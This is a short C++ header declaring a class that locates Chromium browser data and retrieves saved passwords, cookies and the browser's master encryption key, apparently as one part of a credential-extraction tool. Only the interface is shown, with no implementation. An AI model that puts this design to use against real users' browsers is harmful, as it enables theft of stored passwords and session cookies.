#ifndef CHROMIUM_PROCESSOR_HPP
#define CHROMIUM_PROCESSOR_HPP

#include <experimental/filesystem>
#include <openssl/aes.h>
#include <sstream>
#include <string.h>
#include <iostream>
#include "tools.hpp"

using namespace std;

class ChromiumProcessor
{
    public:
    ChromiumProcessor();

    string userdata_path;
    string pass_path;
    string cookies_path;
    string prevBrowser_path;

    stringstream getChromiumPW();
    stringstream getChromiumCookies();
    unsigned char *getMasterKey();

private:
    unsigned char *prevMasterKey;
    sqlite3 *localDB;
};

#if defined(__WIN64__)
    #include <Wincrypt.h>
    #include <tchar.h>
#elif defined(__linux__)
    //linux headers here
#endif

#endif //CHROMIUM_PROCESSOR_HPP
